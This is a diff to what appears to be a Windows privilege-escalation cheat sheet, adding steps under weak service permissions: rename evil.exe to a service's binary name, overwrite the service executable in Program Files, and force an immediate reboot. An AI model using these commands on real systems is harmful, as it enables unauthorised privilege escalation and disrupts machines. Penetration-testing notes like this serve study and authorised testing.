@@ -660,6 +660,11 @@ Everyone:(I)(F)
 BUILTIN\Administrators:(I)(F)
 BUILTIN\Users:(I)(F)
 CHIMERA\steph:(I)(F)
+
+# replace service binary with malicious binary, then restart computer
+cmd> rename evil.exe vulnservice.exe
+cmd> move vulnservice.exe "C:\Program Files\path\to\vulnservice.exe"
+cmd> shutdown /r /t 0
 ```
 
 ### Services - Unquoted Paths
